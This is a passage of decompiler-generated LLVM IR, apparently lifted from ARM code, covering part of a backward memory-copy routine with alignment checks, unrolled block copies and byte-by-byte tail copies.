  store i32 %v1_196c4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_196c4 = icmp eq i32 %v1_196c4, 0
  store i1 %v2_196c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196c4, label %dec_label_pc_196cc, label %dec_label_pc_1976c

dec_label_pc_196cc:                               ; preds = %dec_label_pc_196c4
  %v1_196cc = urem i32 %v2_196b4, 4
  store i32 %v1_196cc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_196cc = icmp eq i32 %v1_196cc, 0
  store i1 %v2_196cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196cc, label %dec_label_pc_196d4, label %dec_label_pc_19798

dec_label_pc_196d4:                               ; preds = %dec_label_pc_196cc, %dec_label_pc_19790
  %v0_196ec36 = phi i32 [ %v2_196b8, %dec_label_pc_196cc ], [ %v0_197e019, %dec_label_pc_19790 ]
  %v0_196e835 = phi i32 [ %v2_196b4, %dec_label_pc_196cc ], [ %v0_19790, %dec_label_pc_19790 ]
  %v0_196d4 = phi i32 [ %v2_196bc, %dec_label_pc_196cc ], [ %v2_19788, %dec_label_pc_19790 ]
  %v2_196d4 = add i32 %v0_196d4, -8
  store i32 %v2_196d4, i32* %r2.global-to-local, align 4
  %v4_196d4 = sub i32 7, %v0_196d4
  %v5_196d4 = and i32 %v4_196d4, %v0_196d4
  %v6_196d4 = icmp slt i32 %v5_196d4, 0
  store i1 %v6_196d4, i1* %cpsr_v.global-to-local, align 1
  %v7_196d4 = icmp slt i32 %v2_196d4, 0
  store i1 %v7_196d4, i1* %cpsr_n.global-to-local, align 1
  %v8_196d4 = icmp eq i32 %v0_196d4, 8
  store i1 %v8_196d4, i1* %cpsr_z.global-to-local, align 1
  %v5_196d8 = icmp slt i32 %v0_196d4, 8
  br i1 %v5_196d8, label %dec_label_pc_19724, label %dec_label_pc_196dc

dec_label_pc_196dc:                               ; preds = %dec_label_pc_196d4
  %v3_196dc = load i32, i32* @r4, align 4
  %v5_196dc = inttoptr i32 %v3_196dc to i8*
  store i8* %v5_196dc, i8** %stack_var_-8, align 4
  %v8_196dc = load i32, i32* @lr, align 4
  %v2_196e0 = add i32 %v0_196d4, -28
  store i32 %v2_196e0, i32* %r2.global-to-local, align 4
  %v4_196e0 = sub i32 27, %v0_196d4
  %v5_196e0 = and i32 %v4_196e0, %v2_196d4
  %v6_196e0 = icmp slt i32 %v5_196e0, 0
  store i1 %v6_196e0, i1* %cpsr_v.global-to-local, align 1
  %v7_196e0 = icmp slt i32 %v2_196e0, 0
  store i1 %v7_196e0, i1* %cpsr_n.global-to-local, align 1
  %v8_196e0 = icmp eq i32 %v2_196d4, 20
  store i1 %v8_196e0, i1* %cpsr_z.global-to-local, align 1
  %v5_196e4 = icmp slt i32 %v2_196d4, 20
  br i1 %v5_196e4, label %dec_label_pc_19700, label %dec_label_pc_196e8

dec_label_pc_196e8:                               ; preds = %dec_label_pc_196dc, %dec_label_pc_196e8.dec_label_pc_196e8_crit_edge
  %v0_196ec = phi i32 [ %v1_196f4, %dec_label_pc_196e8.dec_label_pc_196e8_crit_edge ], [ %v0_196ec36, %dec_label_pc_196dc ]
  %v0_196e8 = phi i32 [ %v0_196e8.pre, %dec_label_pc_196e8.dec_label_pc_196e8_crit_edge ], [ %v0_196e835, %dec_label_pc_196dc ]
  %v1_196e8 = add i32 %v0_196e8, -4
  %v2_196e8 = inttoptr i32 %v1_196e8 to i32*
  %v3_196e8 = load i32, i32* %v2_196e8, align 4
  %v4_196e8 = add i32 %v0_196e8, -8
  %v5_196e8 = inttoptr i32 %v4_196e8 to i32*
  %v6_196e8 = load i32, i32* %v5_196e8, align 4
  store i32 %v6_196e8, i32* %r4.global-to-local, align 4
  %v7_196e8 = add i32 %v0_196e8, -12
  %v8_196e8 = inttoptr i32 %v7_196e8 to i32*
  %v9_196e8 = load i32, i32* %v8_196e8, align 4
  store i32 %v9_196e8, i32* %ip.global-to-local, align 4
  %v10_196e8 = add i32 %v0_196e8, -16
  %v11_196e8 = inttoptr i32 %v10_196e8 to i32*
  %v12_196e8 = load i32, i32* %v11_196e8, align 4
  store i32 %v12_196e8, i32* %lr.global-to-local, align 4
  store i32 %v10_196e8, i32* %r1.global-to-local, align 4
  %v1_196ec = add i32 %v0_196ec, -16
  %v2_196ec = inttoptr i32 %v1_196ec to i32*
  store i32 %v3_196e8, i32* %v2_196ec, align 4
  %v4_196ec = add i32 %v0_196ec, -12
  %v5_196ec = inttoptr i32 %v4_196ec to i32*
  %v6_196ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_196ec, i32* %v5_196ec, align 4
  %v7_196ec = add i32 %v0_196ec, -8
  %v8_196ec = inttoptr i32 %v7_196ec to i32*
  %v9_196ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_196ec, i32* %v8_196ec, align 4
  %v10_196ec = add i32 %v0_196ec, -4
  %v11_196ec = inttoptr i32 %v10_196ec to i32*
  %v12_196ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_196ec, i32* %v11_196ec, align 4
  store i32 %v1_196ec, i32* %r0.global-to-local, align 4
  %v0_196f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_196f0 = add i32 %v0_196f0, -4
  %v2_196f0 = inttoptr i32 %v1_196f0 to i32*
  %v3_196f0 = load i32, i32* %v2_196f0, align 4
  store i32 %v3_196f0, i32* @r3, align 4
  %v4_196f0 = add i32 %v0_196f0, -8
  %v5_196f0 = inttoptr i32 %v4_196f0 to i32*
  %v6_196f0 = load i32, i32* %v5_196f0, align 4
  store i32 %v6_196f0, i32* %r4.global-to-local, align 4
  %v7_196f0 = add i32 %v0_196f0, -12
  %v8_196f0 = inttoptr i32 %v7_196f0 to i32*
  %v9_196f0 = load i32, i32* %v8_196f0, align 4
  store i32 %v9_196f0, i32* @ip, align 4
  %v10_196f0 = add i32 %v0_196f0, -16
  %v11_196f0 = inttoptr i32 %v10_196f0 to i32*
  %v12_196f0 = load i32, i32* %v11_196f0, align 4
  store i32 %v12_196f0, i32* %lr.global-to-local, align 4
  store i32 %v10_196f0, i32* %r1.global-to-local, align 4
  %v1_196f4 = add i32 %v0_196ec, -32
  %v2_196f4 = inttoptr i32 %v1_196f4 to i32*
  store i32 %v3_196f0, i32* %v2_196f4, align 4
  %v4_196f4 = add i32 %v0_196ec, -28
  %v5_196f4 = inttoptr i32 %v4_196f4 to i32*
  %v6_196f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_196f4, i32* %v5_196f4, align 4
  %v7_196f4 = add i32 %v0_196ec, -24
  %v8_196f4 = inttoptr i32 %v7_196f4 to i32*
  %v9_196f4 = load i32, i32* @ip, align 4
  store i32 %v9_196f4, i32* %v8_196f4, align 4
  %v10_196f4 = add i32 %v0_196ec, -20
  %v11_196f4 = inttoptr i32 %v10_196f4 to i32*
  %v12_196f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_196f4, i32* %v11_196f4, align 4
  store i32 %v1_196f4, i32* %r0.global-to-local, align 4
  %v0_196f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_196f8 = add i32 %v0_196f8, -32
  store i32 %v2_196f8, i32* %r2.global-to-local, align 4
  %v6_196fc = icmp slt i32 %v0_196f8, 32
  br i1 %v6_196fc, label %dec_label_pc_19700.loopexit, label %dec_label_pc_196e8.dec_label_pc_196e8_crit_edge

dec_label_pc_196e8.dec_label_pc_196e8_crit_edge:  ; preds = %dec_label_pc_196e8
  %v0_196e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_196e8

dec_label_pc_19700.loopexit:                      ; preds = %dec_label_pc_196e8
  %v4_196f8 = sub i32 31, %v0_196f8
  %v5_196f8 = and i32 %v4_196f8, %v0_196f8
  %v6_196f8 = icmp slt i32 %v5_196f8, 0
  %v7_196f8 = icmp slt i32 %v2_196f8, 0
  store i1 %v6_196f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_196f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19700

dec_label_pc_19700:                               ; preds = %dec_label_pc_19700.loopexit, %dec_label_pc_196dc
  %v6_19708 = phi i32 [ %v1_196f4, %dec_label_pc_19700.loopexit ], [ %v0_196ec36, %dec_label_pc_196dc ]
  %v0_19710.pr = phi i32 [ %v2_196f8, %dec_label_pc_19700.loopexit ], [ %v2_196e0, %dec_label_pc_196dc ]
  %v4_19700 = add i32 %v0_19710.pr, 16
  %v6_19700 = sub i32 0, %v0_19710.pr
  %v7_19700 = and i32 %v4_19700, %v6_19700
  %v8_19700 = icmp slt i32 %v7_19700, 0
  store i1 %v8_19700, i1* %cpsr_v.global-to-local, align 1
  %v9_19700 = icmp slt i32 %v4_19700, 0
  store i1 %v9_19700, i1* %cpsr_n.global-to-local, align 1
  %v10_19700 = icmp eq i32 %v4_19700, 0
  store i1 %v10_19700, i1* %cpsr_z.global-to-local, align 1
  %v5_19704 = icmp slt i32 %v0_19710.pr, -16
  br i1 %v5_19704, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_19700
  %v6_19704 = load i32, i32* %r1.global-to-local, align 4
  %v7_19704 = add i32 %v6_19704, -4
  %v8_19704 = inttoptr i32 %v7_19704 to i32*
  %v9_19704 = load i32, i32* %v8_19704, align 4
  store i32 %v9_19704, i32* @r3, align 4
  %v10_19704 = add i32 %v6_19704, -8
  %v11_19704 = inttoptr i32 %v10_19704 to i32*
  %v12_19704 = load i32, i32* %v11_19704, align 4
  store i32 %v12_19704, i32* %r4.global-to-local, align 4
  %v13_19704 = add i32 %v6_19704, -12
  %v14_19704 = inttoptr i32 %v13_19704 to i32*
  %v15_19704 = load i32, i32* %v14_19704, align 4
  store i32 %v15_19704, i32* @ip, align 4
  %v16_19704 = add i32 %v6_19704, -16
  %v17_19704 = inttoptr i32 %v16_19704 to i32*
  %v18_19704 = load i32, i32* %v17_19704, align 4
  store i32 %v18_19704, i32* %lr.global-to-local, align 4
  store i32 %v16_19704, i32* %r1.global-to-local, align 4
  %v7_19708 = add i32 %v6_19708, -16
  %v8_19708 = inttoptr i32 %v7_19708 to i32*
  store i32 %v9_19704, i32* %v8_19708, align 4
  %v10_19708 = add i32 %v6_19708, -12
  %v11_19708 = inttoptr i32 %v10_19708 to i32*
  %v12_19708 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_19708, i32* %v11_19708, align 4
  %v13_19708 = add i32 %v6_19708, -8
  %v14_19708 = inttoptr i32 %v13_19708 to i32*
  %v15_19708 = load i32, i32* @ip, align 4
  store i32 %v15_19708, i32* %v14_19708, align 4
  %v16_19708 = add i32 %v6_19708, -4
  %v17_19708 = inttoptr i32 %v16_19708 to i32*
  %v18_19708 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_19708, i32* %v17_19708, align 4
  store i32 %v7_19708, i32* %r0.global-to-local, align 4
  %v6_1970c = load i32, i32* %r2.global-to-local, align 4
  %v7_1970c = add i32 %v6_1970c, -16
  store i32 %v7_1970c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19700, %bb147
  %v6_19718 = phi i32 [ %v7_19708, %bb147 ], [ %v6_19708, %dec_label_pc_19700 ]
  %v0_19710 = phi i32 [ %v7_1970c, %bb147 ], [ %v0_19710.pr, %dec_label_pc_19700 ]
  %v4_19710 = add i32 %v0_19710, 20
  store i32 %v4_19710, i32* %r2.global-to-local, align 4
  %v6_19710 = sub i32 0, %v0_19710
  %v7_19710 = and i32 %v4_19710, %v6_19710
  %v8_19710 = icmp slt i32 %v7_19710, 0
  store i1 %v8_19710, i1* %cpsr_v.global-to-local, align 1
  %v9_19710 = icmp slt i32 %v4_19710, 0
  store i1 %v9_19710, i1* %cpsr_n.global-to-local, align 1
  %v10_19710 = icmp eq i32 %v4_19710, 0
  store i1 %v10_19710, i1* %cpsr_z.global-to-local, align 1
  %v5_19714 = icmp slt i32 %v0_19710, -20
  br i1 %v5_19714, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_19714 = load i32, i32* %r1.global-to-local, align 4
  %v7_19714 = add i32 %v6_19714, -4
  %v8_19714 = inttoptr i32 %v7_19714 to i32*
  %v9_19714 = load i32, i32* %v8_19714, align 4
  store i32 %v9_19714, i32* @r3, align 4
  %v10_19714 = add i32 %v6_19714, -8
  %v11_19714 = inttoptr i32 %v10_19714 to i32*
  %v12_19714 = load i32, i32* %v11_19714, align 4
  store i32 %v12_19714, i32* @ip, align 4
  %v13_19714 = add i32 %v6_19714, -12
  %v14_19714 = inttoptr i32 %v13_19714 to i32*
  %v15_19714 = load i32, i32* %v14_19714, align 4
  store i32 %v15_19714, i32* %lr.global-to-local, align 4
  store i32 %v13_19714, i32* %r1.global-to-local, align 4
  %v7_19718 = add i32 %v6_19718, -12
  %v8_19718 = inttoptr i32 %v7_19718 to i32*
  store i32 %v9_19714, i32* %v8_19718, align 4
  %v10_19718 = add i32 %v6_19718, -8
  %v11_19718 = inttoptr i32 %v10_19718 to i32*
  %v12_19718 = load i32, i32* @ip, align 4
  store i32 %v12_19718, i32* %v11_19718, align 4
  %v13_19718 = add i32 %v6_19718, -4
  %v14_19718 = inttoptr i32 %v13_19718 to i32*
  %v15_19718 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_19718, i32* %v14_19718, align 4
  store i32 %v7_19718, i32* %r0.global-to-local, align 4
  %v6_1971c = load i32, i32* %r2.global-to-local, align 4
  %v7_1971c = add i32 %v6_1971c, -12
  store i32 %v7_1971c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1973c44 = phi i32 [ %v6_19718, %.thread1 ], [ %v7_19718, %bb148 ]
  %v0_1972442 = phi i32 [ %v4_19710, %.thread1 ], [ %v7_1971c, %bb148 ]
  %v2_19720 = load i8*, i8** %stack_var_-8, align 4
  %v3_19720 = ptrtoint i8* %v2_19720 to i32
  store i32 %v3_19720, i32* @r4, align 4
  store i32 %v8_196dc, i32* @lr, align 4
  br label %dec_label_pc_19724

dec_label_pc_19724:                               ; preds = %dec_label_pc_196d4, %.thread3
  %v7_19734 = phi i32 [ %v0_196ec36, %dec_label_pc_196d4 ], [ %v6_1973c44, %.thread3 ]
  %v0_19724 = phi i32 [ %v2_196d4, %dec_label_pc_196d4 ], [ %v0_1972442, %.thread3 ]
  %v2_19724 = add i32 %v0_19724, 8
  store i32 %v2_19724, i32* %r2.global-to-local, align 4
  %v4_19724 = sub i32 0, %v0_19724
  %v5_19724 = and i32 %v2_19724, %v4_19724
  %v6_19724 = icmp slt i32 %v5_19724, 0
  store i1 %v6_19724, i1* %cpsr_v.global-to-local, align 1
  %v7_19724 = icmp slt i32 %v2_19724, 0
  store i1 %v7_19724, i1* %cpsr_n.global-to-local, align 1
  %v8_19724 = icmp eq i32 %v2_19724, 0
  store i1 %v8_19724, i1* %cpsr_z.global-to-local, align 1
  %v5_19728 = icmp slt i32 %v0_19724, -8
  br i1 %v5_19728, label %bb150, label %dec_label_pc_1972c

dec_label_pc_1972c:                               ; preds = %dec_label_pc_19724
  %v6_1972c = add i32 %v0_19724, 4
  store i32 %v6_1972c, i32* %r2.global-to-local, align 4
  %v8_1972c = sub i32 -5, %v0_19724
  %v9_1972c = and i32 %v8_1972c, %v2_19724
  %v10_1972c = icmp slt i32 %v9_1972c, 0
  store i1 %v10_1972c, i1* %cpsr_v.global-to-local, align 1
  %v11_1972c = icmp slt i32 %v6_1972c, 0
  store i1 %v11_1972c, i1* %cpsr_n.global-to-local, align 1
  %v12_1972c = icmp eq i32 %v2_19724, 4
  store i1 %v12_1972c, i1* %cpsr_z.global-to-local, align 1
  %v5_19730 = icmp slt i32 %v2_19724, 4
  %v6_19730 = load i32, i32* %r1.global-to-local, align 4
  %v7_19730 = add i32 %v6_19730, -4
  %v8_19730 = inttoptr i32 %v7_19730 to i32*
  %v9_19730 = load i32, i32* %v8_19730, align 4
  store i32 %v9_19730, i32* @r3, align 4
  br i1 %v5_19730, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1972c
  store i32 %v7_19730, i32* %r1.global-to-local, align 4
  %v8_19734 = add i32 %v7_19734, -4
  %v9_19734 = inttoptr i32 %v8_19734 to i32*
  store i32 %v9_19730, i32* %v9_19734, align 4
  %v10_19734 = load i32, i32* %r0.global-to-local, align 4
  %v11_19734 = add i32 %v10_19734, -4
  store i32 %v11_19734, i32* %r0.global-to-local, align 4
  %v0_19744.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1972c
  %v10_19738 = add i32 %v6_19730, -8
  %v11_19738 = inttoptr i32 %v10_19738 to i32*
  %v12_19738 = load i32, i32* %v11_19738, align 4
  store i32 %v12_19738, i32* @ip, align 4
  store i32 %v10_19738, i32* %r1.global-to-local, align 4
  %v7_1973c = add i32 %v7_19734, -8
  %v8_1973c = inttoptr i32 %v7_1973c to i32*
  store i32 %v9_19730, i32* %v8_1973c, align 4
  %v10_1973c = add i32 %v7_19734, -4
  %v11_1973c = inttoptr i32 %v10_1973c to i32*
  %v12_1973c = load i32, i32* @ip, align 4
  store i32 %v12_1973c, i32* %v11_1973c, align 4
  store i32 %v7_1973c, i32* %r0.global-to-local, align 4
  %v6_19740 = load i32, i32* %r2.global-to-local, align 4
  %v7_19740 = add i32 %v6_19740, -4
  store i32 %v7_19740, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_19724, %dec_label_pc_196b4, %.thread13, %dec_label_pc_198e8, %dec_label_pc_1987c, %dec_label_pc_19810, %bb149
  %v2_19748 = phi i32 [ %v11_19734, %.thread7 ], [ %v7_19734, %dec_label_pc_19724 ], [ %v2_196b8, %dec_label_pc_196b4 ], [ %v0_197e019, %.thread13 ], [ %v2_1975452, %dec_label_pc_198e8 ], [ %v2_1975451, %dec_label_pc_1987c ], [ %v2_1975450, %dec_label_pc_19810 ], [ %v7_1973c, %bb149 ]
  %v0_19744 = phi i32 [ %v0_19744.pre, %.thread7 ], [ %v2_19724, %dec_label_pc_19724 ], [ %v2_196bc, %dec_label_pc_196b4 ], [ %v2_19788, %.thread13 ], [ %v0_1974448, %dec_label_pc_198e8 ], [ %v0_1974447, %dec_label_pc_1987c ], [ %v0_1974446, %dec_label_pc_19810 ], [ %v7_19740, %bb149 ]
  %v1_19744 = add i32 %v0_19744, 4
  store i32 %v1_19744, i32* @r2, align 4
  %v3_19744 = sub i32 0, %v0_19744
  %v4_19744 = and i32 %v1_19744, %v3_19744
  %v5_19744 = icmp slt i32 %v4_19744, 0
  store i1 %v5_19744, i1* %cpsr_v.global-to-local, align 1
  %v6_19744 = icmp slt i32 %v1_19744, 0
  store i1 %v6_19744, i1* %cpsr_n.global-to-local, align 1
  %v7_19744 = icmp eq i32 %v1_19744, 0
  store i1 %v7_19744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19744, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1974c = add i32 %v0_19744, 2
  %v3_1974c = sub i32 -3, %v0_19744
  %v4_1974c = and i32 %v3_1974c, %v1_19744
  %v5_1974c = icmp slt i32 %v4_1974c, 0
  store i1 %v5_1974c, i1* %cpsr_v.global-to-local, align 1
  %v6_1974c = icmp slt i32 %v1_1974c, 0
  store i1 %v6_1974c, i1* %cpsr_n.global-to-local, align 1
  %v7_1974c = icmp eq i32 %v1_19744, 2
  store i1 %v7_1974c, i1* %cpsr_z.global-to-local, align 1
  %v0_19750 = load i32, i32* %r1.global-to-local, align 4
  %v1_19750 = add i32 %v0_19750, -1
  %v2_19750 = inttoptr i32 %v1_19750 to i8*
  %v3_19750 = load i8, i8* %v2_19750, align 1
  %v4_19750 = zext i8 %v3_19750 to i32
  store i32 %v4_19750, i32* @r3, align 4
  store i32 %v1_19750, i32* %r1.global-to-local, align 4
  %v3_19754 = add i32 %v2_19748, -1
  %v4_19754 = inttoptr i32 %v3_19754 to i8*
  store i8 %v3_19750, i8* %v4_19754, align 1
  %v5_19754 = load i32, i32* %r0.global-to-local, align 4
  %v6_19754 = add i32 %v5_19754, -1
  store i32 %v6_19754, i32* %r0.global-to-local, align 4
  %v0_19758 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19758 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19758 = xor i1 %v0_19758, %v1_19758
  br i1 %v2_19758, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_19758 = load i32, i32* %r1.global-to-local, align 4
  %v4_19758 = add i32 %v3_19758, -1
  %v5_19758 = inttoptr i32 %v4_19758 to i8*
  %v6_19758 = load i8, i8* %v5_19758, align 1
  %v7_19758 = zext i8 %v6_19758 to i32
  store i32 %v7_19758, i32* @r3, align 4
  store i32 %v4_19758, i32* %r1.global-to-local, align 4
  %v6_1975c = add i32 %v5_19754, -2
  %v7_1975c = inttoptr i32 %v6_1975c to i8*
  store i8 %v6_19758, i8* %v7_1975c, align 1
  %v8_1975c = load i32, i32* %r0.global-to-local, align 4
  %v9_1975c = add i32 %v8_1975c, -1
  store i32 %v9_1975c, i32* %r0.global-to-local, align 4
  %v1_19760.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19760.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_19764 = phi i32 [ %v9_1975c, %bb152 ], [ %v6_19754, %bb151 ]
  %v2_19764 = phi i1 [ %v2_19760.pre, %bb152 ], [ %v1_19758, %bb151 ]
  %v1_19764 = phi i1 [ %v1_19760.pre, %bb152 ], [ %v0_19758, %bb151 ]
  %v0_19760 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_19760 = xor i1 %v2_19764, %v1_19764
  %v4_19760 = or i1 %v0_19760, %v3_19760
  br i1 %v4_19760, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_19760 = load i32, i32* %r1.global-to-local, align 4
  %v6_19760 = add i32 %v5_19760, -1
  %v7_19760 = inttoptr i32 %v6_19760 to i8*
  %v8_19760 = load i8, i8* %v7_19760, align 1
  %v9_19760 = zext i8 %v8_19760 to i32
  store i32 %v9_19760, i32* @r3, align 4
  store i32 %v6_19760, i32* %r1.global-to-local, align 4
  %v8_19764 = add i32 %v7_19764, -1
  %v9_19764 = inttoptr i32 %v8_19764 to i8*
  store i8 %v8_19760, i8* %v9_19764, align 1
  %v10_19764 = load i32, i32* %r0.global-to-local, align 4
  %v11_19764 = add i32 %v10_19764, -1
  store i32 %v11_19764, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1976c:                               ; preds = %dec_label_pc_196c4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1976c = icmp eq i32 %v1_196c4, 1
  store i1 %v8_1976c, i1* %cpsr_n.global-to-local, align 1
  %v9_1976c = icmp eq i32 %v1_196c4, 2
  store i1 %v9_1976c, i1* %cpsr_z.global-to-local, align 1
  %v1_19770 = add i32 %v2_196b4, -1
  %v2_19770 = inttoptr i32 %v1_19770 to i8*
  %v3_19770 = load i8, i8* %v2_19770, align 1
  %v4_19770 = zext i8 %v3_19770 to i32
  store i32 %v4_19770, i32* @r3, align 4
  store i32 %v1_19770, i32* %r1.global-to-local, align 4
  %v3_19774 = add i32 %v2_196b8, -1
  %v4_19774 = inttoptr i32 %v3_19774 to i8*
  store i8 %v3_19770, i8* %v4_19774, align 1
  %v5_19774 = load i32, i32* %r0.global-to-local, align 4
  %v6_19774 = add i32 %v5_19774, -1
  store i32 %v6_19774, i32* %r0.global-to-local, align 4
  br i1 %v8_1976c, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1976c
  %v6_19778 = load i32, i32* %r1.global-to-local, align 4
  %v7_19778 = add i32 %v6_19778, -1
  %v8_19778 = inttoptr i32 %v7_19778 to i8*
  %v9_19778 = load i8, i8* %v8_19778, align 1
  %v10_19778 = zext i8 %v9_19778 to i32
  store i32 %v10_19778, i32* @r3, align 4
  store i32 %v7_19778, i32* %r1.global-to-local, align 4
  %v9_1977c = add i32 %v5_19774, -2
  %v10_1977c = inttoptr i32 %v9_1977c to i8*
  store i8 %v9_19778, i8* %v10_1977c, align 1
  %v11_1977c = load i32, i32* %r0.global-to-local, align 4
  %v12_1977c = add i32 %v11_1977c, -1
  store i32 %v12_1977c, i32* %r0.global-to-local, align 4
  br i1 %v9_1976c, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_19780 = load i32, i32* %r1.global-to-local, align 4
  %v9_19780 = add i32 %v8_19780, -1
  %v10_19780 = inttoptr i32 %v9_19780 to i8*
  %v11_19780 = load i8, i8* %v10_19780, align 1
  %v12_19780 = zext i8 %v11_19780 to i32
  store i32 %v12_19780, i32* @r3, align 4
  store i32 %v9_19780, i32* %r1.global-to-local, align 4
  %v11_19784 = add i32 %v11_1977c, -2
  %v12_19784 = inttoptr i32 %v11_19784 to i8*
  store i8 %v11_19780, i8* %v12_19784, align 1
  %v13_19784 = load i32, i32* %r0.global-to-local, align 4
  %v14_19784 = add i32 %v13_19784, -1
  store i32 %v14_19784, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1976c, %bb155
  %v0_197e019 = phi i32 [ %v12_1977c, %bb154 ], [ %v6_19774, %dec_label_pc_1976c ], [ %v14_19784, %bb155 ]
  %v0_19788 = load i32, i32* %r2.global-to-local, align 4
  %v1_19788 = load i32, i32* @ip, align 4
  %v2_19788 = sub i32 %v0_19788, %v1_19788
  store i32 %v2_19788, i32* %r2.global-to-local, align 4
  %v4_19788 = xor i32 %v1_19788, %v0_19788
  %v5_19788 = xor i32 %v2_19788, %v0_19788
  %v6_19788 = and i32 %v5_19788, %v4_19788
  %v7_19788 = icmp slt i32 %v6_19788, 0
  store i1 %v7_19788, i1* %cpsr_v.global-to-local, align 1
  %v8_19788 = icmp slt i32 %v2_19788, 0
  store i1 %v8_19788, i1* %cpsr_n.global-to-local, align 1
  %v9_19788 = icmp eq i32 %v0_19788, %v1_19788
  store i1 %v9_19788, i1* %cpsr_z.global-to-local, align 1
  %v5_1978c = icmp slt i32 %v0_19788, %v1_19788
  br i1 %v5_1978c, label %bb150, label %dec_label_pc_19790

dec_label_pc_19790:                               ; preds = %.thread13
  %v0_19790 = load i32, i32* %r1.global-to-local, align 4
  %v1_19790 = urem i32 %v0_19790, 4
  store i32 %v1_19790, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19790 = icmp eq i32 %v1_19790, 0
  store i1 %v2_19790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19790, label %dec_label_pc_196d4, label %dec_label_pc_19798

dec_label_pc_19798:                               ; preds = %dec_label_pc_196cc, %dec_label_pc_19790
  %v0_197e018 = phi i32 [ %v2_196b8, %dec_label_pc_196cc ], [ %v0_197e019, %dec_label_pc_19790 ]
  %v0_1988c = phi i32 [ %v2_196bc, %dec_label_pc_196cc ], [ %v2_19788, %dec_label_pc_19790 ]
  %v0_19798 = phi i32 [ %v2_196b4, %dec_label_pc_196cc ], [ %v0_19790, %dec_label_pc_19790 ]
  %v0_197a0 = phi i32 [ %v1_196cc, %dec_label_pc_196cc ], [ %v1_19790, %dec_label_pc_19790 ]
  %v1_19798 = and i32 %v0_19798, -4
  store i32 %v1_19798, i32* %r1.global-to-local, align 4
  %v1_1979c = inttoptr i32 %v1_19798 to i32*
  %v2_1979c = load i32, i32* %v1_1979c, align 4
  store i32 %v2_1979c, i32* @r3, align 4
  %v7_197a0 = icmp ult i32 %v0_197a0, 2
  %v2_19884 = add i32 %v0_1988c, -12
  %v4_19884 = sub i32 11, %v0_1988c
  %v5_19884 = and i32 %v4_19884, %v0_1988c
  %v6_19884 = icmp slt i32 %v5_19884, 0
  store i1 %v6_19884, i1* %cpsr_v.global-to-local, align 1
  %v7_19884 = icmp slt i32 %v2_19884, 0
  store i1 %v7_19884, i1* %cpsr_n.global-to-local, align 1
  %v8_19884 = icmp eq i32 %v0_1988c, 12
  store i1 %v8_19884, i1* %cpsr_z.global-to-local, align 1
  %v5_19888 = icmp slt i32 %v0_1988c, 12
  br i1 %v7_197a0, label %dec_label_pc_19884, label %dec_label_pc_197a8

dec_label_pc_197a8:                               ; preds = %dec_label_pc_19798
  %v8_197a0 = icmp eq i32 %v0_197a0, 2
  br i1 %v8_197a0, label %dec_label_pc_19818, label %dec_label_pc_197ac

dec_label_pc_197ac:                               ; preds = %dec_label_pc_197a8
  br i1 %v5_19888, label %dec_label_pc_197f8, label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %dec_label_pc_197ac
  store i32 %v2_19884, i32* %r2.global-to-local, align 4
  %v3_197b8 = load i32, i32* @r4, align 4
  store i32 %v3_197b8, i32* %stack_var_-12, align 4
  %v6_197b8 = load i32, i32* @r5, align 4
  %v8_197b8 = inttoptr i32 %v6_197b8 to i8*
  store i8* %v8_197b8, i8** %stack_var_-8, align 4
  %v11_197b8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_197bc

dec_label_pc_197bc:                               ; preds = %dec_label_pc_197bc.dec_label_pc_197bc_crit_edge, %dec_label_pc_197b4
  %v0_197e0 = phi i32 [ %v1_197e0, %dec_label_pc_197bc.dec_label_pc_197bc_crit_edge ], [ %v0_197e018, %dec_label_pc_197b4 ]
  %v0_197c0 = phi i32 [ %v0_197c0.pre, %dec_label_pc_197bc.dec_label_pc_197bc_crit_edge ], [ %v1_19798, %dec_label_pc_197b4 ]
